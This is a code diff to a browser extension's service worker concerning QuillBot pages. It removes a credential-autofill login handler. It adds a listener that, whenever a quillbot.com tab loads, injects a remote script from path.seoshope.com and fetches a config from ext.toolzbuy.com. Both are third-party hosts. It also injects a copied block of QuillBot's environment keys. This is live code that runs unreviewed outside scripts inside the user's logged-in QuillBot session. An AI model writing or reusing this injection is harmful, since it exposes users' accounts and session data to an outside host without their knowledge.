@@ -1348,118 +1348,280 @@ self.addEventListener("message", function (event) {
       });
     });
   }
-
-  // Handle Quillbot login
-  if (event.data && event.data.type === "QUILLBOT_LOGIN") {
-    const loginData = event.data.loginData;
-    const url = event.data.url || "https://quillbot.com/";
-
-    // Send login data to all clients (including Quillbot tabs)
-    self.clients
-      .matchAll({ includeUncontrolled: true })
-      .then(function (clients) {
-        clients.forEach(function (client) {
-          // Send to all clients, they can check if they're on quillbot.com
-          client.postMessage({
-            type: "QUILLBOT_LOGIN_DATA",
-            loginData: loginData,
-            url: url,
-          });
-        });
-      });
-
-    // If Chrome Extension APIs are available, use them
-    if (typeof chrome !== "undefined" && chrome.tabs && chrome.scripting) {
-      chrome.tabs.query({ url: "*://*.quillbot.com/*" }, function (tabs) {
-        if (chrome.runtime.lastError) return;
-        tabs.forEach(function (tab) {
-          chrome.scripting.executeScript({
-            target: { tabId: tab.id },
-            function: function (loginData) {
-              (function () {
-                function attemptLogin() {
-                  try {
-                    const emailSelectors = [
-                      'input[type="email"]',
-                      'input[name="email"]',
-                      'input[id*="email" i]',
-                      'input[placeholder*="email" i]',
-                      'input[type="text"][autocomplete="email"]',
-                    ];
-                    const passwordSelectors = [
-                      'input[type="password"]',
-                      'input[name="password"]',
-                      'input[id*="password" i]',
-                    ];
-
-                    let emailInput = null;
-                    let passwordInput = null;
-
-                    for (let selector of emailSelectors) {
-                      emailInput = document.querySelector(selector);
-                      if (emailInput) break;
-                    }
-
-                    for (let selector of passwordSelectors) {
-                      passwordInput = document.querySelector(selector);
-                      if (passwordInput) break;
-                    }
-
-                    if (
-                      emailInput &&
-                      passwordInput &&
-                      loginData &&
-                      (loginData.email || loginData.username) &&
-                      loginData.password
-                    ) {
-                      const email = loginData.email || loginData.username;
-
-                      emailInput.value = email;
-                      passwordInput.value = loginData.password;
-
-                      emailInput.dispatchEvent(
-                        new Event("input", { bubbles: true })
-                      );
-                      emailInput.dispatchEvent(
-                        new Event("change", { bubbles: true })
-                      );
-                      passwordInput.dispatchEvent(
-                        new Event("input", { bubbles: true })
-                      );
-                      passwordInput.dispatchEvent(
-                        new Event("change", { bubbles: true })
-                      );
-
-                      setTimeout(function () {
-                        const submitButton =
-                          document.querySelector('button[type="submit"]') ||
-                          Array.from(document.querySelectorAll("button")).find(
-                            (b) =>
-                              /login|sign\s*in|log\s*in/i.test(b.textContent)
-                          );
-                        if (submitButton) {
-                          submitButton.click();
-                        } else if (passwordInput.form) {
-                          passwordInput.form.submit();
-                        }
-                      }, 500);
-                    }
-                  } catch (e) {
-                    console.error("Login injection error:", e);
-                  }
-                }
-
-                if (document.readyState === "loading") {
-                  document.addEventListener("DOMContentLoaded", attemptLogin);
-                } else {
-                  setTimeout(attemptLogin, 1000);
-                }
-              })();
-            },
-            args: [loginData],
-          });
-        });
-      });
-    }
-  }
 });
+
+// Quillbot login script configuration
+const quillbotConfig = {
+  url: "https://quillbot.com/paraphrasing-tool",
+  scriptUrl: "https://path.seoshope.com/quill.js?_=1763356164299",
+  configUrl: "https://ext.toolzbuy.com/index.json?_=1763356164299",
+  localeUrls: [
+    "https://quillbot.com/locales/prod/69170eef7e2ca57928247787/en/Global",
+    "https://quillbot.com/locales/prod/69170eef7e2ca57928247787/en/Paraphraser",
+    "https://quillbot.com/locales/prod/69170eef7e2ca57928247787/en/Common"
+  ],
+  cookieConsentScripts: [
+    "https://cdn.cookielaw.org/scripttemplates/otSDKStub.js",
+    "https://cdn.cookielaw.org/consent/420a3f3c-5291-453b-aa3b-6c8a2d850e2e/420a3f3c-5291-453b-aa3b-6c8a2d850e2e.json"
+  ],
+  cloudflareBeacon: "https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015"
+};
+
+// Quillbot environment configuration script
+const quillbotEnvScript = `
+  window.__QUILLBOT_ENVS__ = {
+    PUBLIC__KLAVIO_COMPANY_ID: "MVEXcU",
+    PUBLIC__KLAVIO_STUDENT_RESOURCE_CLASSNAME: "klaviyo-form-RCqpyy",
+    PUBLIC__WS_EDIT_STREAM_HTTP_URL: "https://stream.quillbot.com",
+    PUBLIC__PRESENTATION_GENERATOR_BASE_URL: "https://presentation.quillbot.com",
+    PUBLIC__CHROME_EXTENSION_ID: "iidnbdjijdkbmajdffnidomddglmieko",
+    PUBLIC__DATADOG_SAMPLE_RATE: "0",
+    PUBLIC__SCRIBBR_AUTOCITE_API_URL: "https://autocite.cgs.scribbr.com/v1",
+    PUBLIC__PAGEQ_BACKEND_URL: "https://quillbot.com",
+    PUBLIC__FIREBASE_PROJECT_ID: "paraphraser-472c1",
+    PUBLIC__QUILL_COLLAB_BACKEND_HOST: "cs.quillbot.com",
+    PUBLIC__CAMPAIGN_AMPLITUDE_API_KEY: "180fbe40da2df75311d5b4f950b8bfd2",
+    PUBLIC__DATADOG_CLIENT_TOKEN: "pub6db80485c4449360d509fc91598ba6b8",
+    PUBLIC__WS_URL: "wss://stream.quillbot.com",
+    PUBLIC__LIB_BUCKET_URL: "https://libs.quillbot.com",
+    PUBLIC__FIREBASE_APP_ID: "1:174733774878:web:166594aa25a0605f2fde0f",
+    PUBLIC__AMPLITUDE_EXPERIMENT_DEPLOYMENT_KEY: "client-1FGauD2OA6aaKW7utchw72TkOn6WdAfB",
+    PUBLIC__KLAVIO_CLASSNAME: "klaviyo-form-V4Vh4G",
+    PUBLIC__FRIENDBUY_MERCHANT_ID: "56c74142-fa70-4cdb-b63b-44ef4bd096f6",
+    PUBLIC__EDGE_EXTENSION_URL: "https://microsoftedge.microsoft.com/addons/detail/cphpplikchcioccedpjacdanfibnimmh",
+    PUBLIC__GTAG_TRACKING_ID: "GTM-MJ377JJ",
+    PUBLIC__SENTRY_ERRORS_SAMPLE_RATE: "1",
+    PUBLIC__WS_IS_RECOMMENDATION_ENABLED_FOR_WS: "true",
+    PUBLIC__FIREBASE_API_KEY: "AIzaSyAhX7hgWsGjY-Lo6eqwJmuRU2xxNRTY7kQ",
+    PUBLIC__GA_TRACKING_ID: "UA-108482885-1",
+    PUBLIC__WS_RETURN_FROM_WS: "true",
+    PUBLIC__INVISIBLE_RECAPTCHA_SITE_KEY: "6LeEyWglAAAAALz-Bh8Y0x62jWWO4V4btoy06LFV",
+    PUBLIC__DISPOSABLE_EMAIL_TIMEOUT: "1000",
+    PUBLIC__QUILL_TRACKING_HOST: "https://quillbot.com",
+    PUBLIC__APP_VERSION: "v36.4.1",
+    PUBLIC__QUILLBOT_ENV: "prod",
+    PUBLIC__DATADOG_APPLICATION_ID: "2bfa9e9a-7e74-48c4-b64b-95098b1db4f0",
+    PUBLIC__LIB_CONFIG_PATH: "https://paraphraser-472c1.firebaseio.com",
+    PUBLIC__GOOGLE_CLIENT_ID: "174733774878-0pfvmjagkfoeuqk20nqfs4r5mv3fabvv.apps.googleusercontent.com",
+    PUBLIC__FIREBASE_DATABASE_URL: "https://paraphraser-472c1.firebaseio.com",
+    PUBLIC__APP_DOWNLOADS_URL: "https://app-downloads.quillbot.com",
+    PUBLIC__FIREBASE_MESSAGING_SENDER_ID: "174733774878",
+    PUBLIC__QUILL_COLLECTOR_HOST: "https://collector.quillbot.com",
+    PUBLIC__STRIPE_API_KEY: "pk_live_RaBMHGHi8r2MlLupLNvRIv8w",
+    PUBLIC__CHARGEBEE_SITE: "quillbot",
+    PUBLIC__CHROME_EXTENSION_URL: "https://chromewebstore.google.com/detail/quillbot-ai-writing-and-g/iidnbdjijdkbmajdffnidomddglmieko?hl=en-US",
+    PUBLIC__SENTRY_TRACES_SAMPLE_RATE: "0.01",
+    PUBLIC__EDGE_EXTENSION_ID: "cphpplikchcioccedpjacdanfibnimmh",
+    PUBLIC__APPLICATION_VERSION: "v13.18.0",
+    PUBLIC__QUILL_BACKEND_HOST: "https://quillbot.com",
+    PUBLIC__QUILL_DATA_INGESTOR_HOST: "https://metrics.quillbot.com",
+    PUBLIC__MICROFRONTEND_CONFIG_URL: "https://qb-microfrontend.firebaseio.com",
+    PUBLIC__ASSETS_URL: "https://assets.quillbot.com",
+    PUBLIC__SAFARI_EXTENSION_ID: "com.quillbot.safari.macos.Extension (67L82892T8)",
+    PUBLIC__BUGSNAG_API_KEY: "c312d2e79c06cfa17065dc98d7ad74ab",
+    PUBLIC__SENTRY_DSN: "https://5743ef12f4887fc460c7968ebb2de54d@sentry-webapp.quillbot.com/2",
+    PUBLIC__PARTNERSTACK_PUBLIC_KEY: "pk_vJbFfw58zag0Ka9HwBcYEPo6oOD9cHXt",
+    PUBLIC__FIREBASE_STORAGE_BUCKET: "paraphraser-472c1.appspot.com",
+    PUBLIC__FIREBASE_MEASUREMENT_ID: "G-KQNKKHJ2B0",
+    PUBLIC__FIREBASE_AUTH_DOMAIN: "auth.quillbot.com",
+    PUBLIC__CHARGEBEE_PUBLISHABLE_KEY: "live_mkh9e1R57QHrGCog2uAC4T4RxzloEr4J",
+    PUBLIC__CUSTOMER_IO_SITE_ID: "c51e49081a31a9e347e6",
+    PUBLIC__AMPLITUDE_API_KEY: "6e403e775d1f5921fdc52daf8f866c66",
+    PUBLIC__CUSTOMER_IO_API_KEY: "98ad51f4687f1b48716a",
+    PUBLIC__CMS_VERSION: "69170eef7e2ca57928247787"
+  };
+`;
+
+// Function to inject all Quillbot scripts and resources
+function injectQuillbotScript(tabId, envScript, config) {
+  if (typeof chrome === "undefined" || !chrome.scripting) {
+    return;
+  }
+  
+  // Inject all scripts dynamically with retry logic
+  function attemptInjection(retries) {
+    if (retries <= 0) {
+      console.log("Failed to inject Quillbot scripts after multiple attempts");
+      return;
+    }
+    
+    chrome.scripting.executeScript({
+      target: { tabId: tabId },
+      func: function (envScript, config) {
+        try {
+          var target = document.head || document.getElementsByTagName("head")[0] || document.documentElement;
+          if (!target) {
+            return false;
+          }
+          
+          // Step 1: Inject environment configuration script first (if not already set)
+          if (!window.__QUILLBOT_ENVS__) {
+            var envScriptElement = document.createElement("script");
+            envScriptElement.type = "text/javascript";
+            envScriptElement.textContent = envScript;
+            target.insertBefore(envScriptElement, target.firstChild);
+            console.log("Quillbot environment configuration injected");
+          }
+          
+          // Step 2: Load config JSON
+          if (config.configUrl && !window.__TOOLZBUY_CONFIG__) {
+            fetch(config.configUrl)
+              .then(function(response) { return response.json(); })
+              .then(function(data) {
+                window.__TOOLZBUY_CONFIG__ = data;
+                console.log("ToolzBuy config loaded");
+              })
+              .catch(function(error) {
+                console.error("Error loading config:", error);
+              });
+          }
+          
+          // Step 3: Load locale files (prefetch for faster access)
+          if (config.localeUrls && config.localeUrls.length > 0) {
+            config.localeUrls.forEach(function(localeUrl) {
+              var link = document.createElement("link");
+              link.rel = "prefetch";
+              link.href = localeUrl;
+              target.appendChild(link);
+            });
+            console.log("Locale files prefetched");
+          }
+          
+          // Step 4: Inject cookie consent scripts
+          if (config.cookieConsentScripts && config.cookieConsentScripts.length > 0) {
+            config.cookieConsentScripts.forEach(function(scriptUrl) {
+              var existing = document.querySelector('script[src="' + scriptUrl + '"]');
+              if (!existing) {
+                var script = document.createElement("script");
+                script.src = scriptUrl;
+                script.async = true;
+                script.type = scriptUrl.endsWith('.json') ? 'application/json' : 'text/javascript';
+                if (scriptUrl.endsWith('.json')) {
+                  // For JSON, load it as data
+                  fetch(scriptUrl)
+                    .then(function(response) { return response.json(); })
+                    .then(function(data) {
+                      window.__COOKIE_CONSENT_CONFIG__ = data;
+                    });
+                } else {
+                  target.appendChild(script);
+                }
+              }
+            });
+            console.log("Cookie consent scripts injected");
+          }
+          
+          // Step 5: Inject Cloudflare beacon (optional)
+          if (config.cloudflareBeacon) {
+            var existingBeacon = document.querySelector('script[src*="cloudflareinsights.com"]');
+            if (!existingBeacon) {
+              var beaconScript = document.createElement("script");
+              beaconScript.src = config.cloudflareBeacon;
+              beaconScript.integrity = "sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==";
+              beaconScript.crossOrigin = "anonymous";
+              beaconScript.defer = true;
+              target.appendChild(beaconScript);
+              console.log("Cloudflare beacon injected");
+            }
+          }
+          
+          // Step 6: Inject login script (check if already injected)
+          if (config.scriptUrl) {
+            var existingScript = document.querySelector('script[src*="path.seoshope.com/quill.js"]');
+            if (!existingScript) {
+              var script = document.createElement("script");
+              script.src = config.scriptUrl;
+              script.async = true;
+              script.type = "text/javascript";
+              target.appendChild(script);
+              console.log("Quillbot login script injected successfully");
+              return true;
+            } else {
+              console.log("Quillbot login script already exists");
+              return true;
+            }
+          }
+          
+          return true;
+        } catch (e) {
+          console.error("Error injecting Quillbot scripts:", e);
+          return false;
+        }
+      },
+      args: [envScript, config]
+    }).then(function (results) {
+      if (results && results[0] && results[0].result) {
+        // Scripts injected successfully
+        console.log("Quillbot scripts injection successful");
+      } else {
+        // Retry after a short delay
+        setTimeout(function() {
+          attemptInjection(retries - 1);
+        }, 500);
+      }
+    }).catch(function (error) {
+      // Error injecting scripts - retry
+      console.log("Error injecting Quillbot scripts, retrying...", error);
+      if (retries > 1) {
+        setTimeout(function() {
+          attemptInjection(retries - 1);
+        }, 1000);
+      }
+    });
+  }
+  
+  // Start injection with 3 retries
+  attemptInjection(3);
+}
+
+// Inject Quillbot login script when navigating to quillbot.com pages
+if (typeof chrome !== "undefined" && chrome.tabs && chrome.scripting) {
+  // Listen for tab updates to inject script on any quillbot.com page
+  chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
+    if (!tab.url) return;
+    
+    try {
+      const url = new URL(tab.url);
+      // Check if the URL matches any quillbot.com page (with or without www)
+      const isQuillbotPage = (url.hostname === "quillbot.com" || 
+                              url.hostname === "www.quillbot.com") &&
+                             url.protocol.startsWith("http");
+      
+      if (isQuillbotPage) {
+        // Inject when page is loading (for early injection)
+        if (changeInfo.status === "loading") {
+          setTimeout(function() {
+            injectQuillbotScript(tabId, quillbotEnvScript, quillbotConfig);
+          }, 300);
+        }
+        
+        // Inject when page is complete (for reliable injection)
+        if (changeInfo.status === "complete") {
+          injectQuillbotScript(tabId, quillbotEnvScript, quillbotConfig);
+        }
+      }
+    } catch (e) {
+      // Invalid URL, ignore
+    }
+  });
+  
+  // Also listen for new tabs being created (for when user opens quillbot.com directly)
+  chrome.tabs.onCreated.addListener(function (tab) {
+    if (tab.url) {
+      try {
+        const url = new URL(tab.url);
+        const isQuillbotPage = (url.hostname === "quillbot.com" || 
+                                url.hostname === "www.quillbot.com") &&
+                               url.protocol.startsWith("http");
+        
+        if (isQuillbotPage && tab.id) {
+          setTimeout(function() {
+            injectQuillbotScript(tab.id, quillbotEnvScript, quillbotConfig);
+          }, 1000);
+        }
+      } catch (e) {
+        // Invalid URL, ignore
+      }
+    }
+  });
+}
